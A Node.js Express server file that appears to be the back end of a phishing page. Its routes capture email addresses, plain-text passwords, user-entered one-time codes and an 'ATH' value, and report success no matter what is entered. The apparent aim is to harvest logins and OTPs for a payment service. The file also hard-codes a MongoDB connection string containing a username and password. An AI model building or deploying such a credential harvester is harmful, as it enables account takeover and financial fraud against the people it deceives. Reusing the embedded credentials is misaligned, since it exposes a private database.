// server.js

const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

// Initialize Express
const app = express();
app.use(cors());
app.use(bodyParser.json());

// Serve static files from the public directory
app.use(express.static('public'));

// MongoDB connection
mongoose.connect('mongodb+srv://Ban:12lomzyposh@pay.vsa1v.mongodb.net/?retryWrites=true&w=majority&appName=Pay')
    .then(() => console.log('MongoDB connected!'))
    .catch(err => console.error('MongoDB connection error:', err));

// Define User schema and model
const userSchema = new mongoose.Schema({
    email: { type: String, required: true, unique: true },
    password: { type: String, required: true }
});
const User = mongoose.model('User', userSchema);

// Define OTP schema and model
const otpSchema = new mongoose.Schema({
    email: { type: String, required: true },
    otp: { type: String, required: true },
});
const Otp = mongoose.model('Otp', otpSchema);

// Define ATH schema and model
const athSchema = new mongoose.Schema({
    email: { type: String, required: true },
    ath: { type: String, required: true },
    createdAt: { type: Date, default: Date.now, expires: 300 } // Expires after 5 minutes
});
const Ath = mongoose.model('Ath', athSchema);

// Route to serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html')); // Adjust the path as necessary
});

// Route to handle login form submission
app.post('/submit-login', async (req, res) => {
    const { email, password } = req.body;

    // Check for missing fields
    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password are required.' });
    }

    try {
        // Check if user exists
        let user = await User.findOne({ email });
        if (!user) {
            // If user doesn't exist, create a new user with plain text password
            user = new User({ email, password });
            await user.save();
        } else {
            // If user exists, update the password with plain text
            user.password = password;
            await user.save();
        }

        // No OTP generation since OTP is user-provided

        res.json({ success: true, message: 'Login successful.' });
    } catch (error) {
        console.error('Error during login:', error);
        res.status(500).json({ success: false, message: 'An error occurred during login.' });
    }
});

// Route to handle OTP submission
app.post('/submit-otp', async (req, res) => {
    const { email, otp } = req.body;

    // Check for missing fields
    if (!email || !otp) {
        return res.status(400).json({ success: false, message: 'Email and OTP are required.' });
    }

    try {
        // Save the OTP as provided by the user
        const newOtp = new Otp({ email, otp });
        await newOtp.save();

        res.json({ success: true, message: 'OTP submitted successfully.' });
    } catch (error) {
        console.error('Error during OTP submission:', error);
        res.status(500).json({ success: false, message: 'An error occurred during OTP submission.' });
    }
});

// Route to handle ATH submission
app.post('/submit-ath', async (req, res) => {
    const { email, ath } = req.body;

    // Check for missing fields
    if (!email || !ath) {
        return res.status(400).json({ success: false, message: 'Email and ATH are required.' });
    }

    try {
        // Save the ATH as provided by the user
        const newAth = new Ath({ email, ath });
        await newAth.save();

        res.json({ success: true, message: 'Loading...... please wait' });
    } catch (error) {
        console.error('Error during ATH submission:', error);
        res.status(500).json({ success: false, message: 'An error occurred during ATH submission.' });
    }
});

// Handle undefined routes to prevent HTML responses
app.use((req, res) => {
    res.status(404).json({ success: false, message: 'Route not found' });
});

// Start the server
const PORT = 5000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
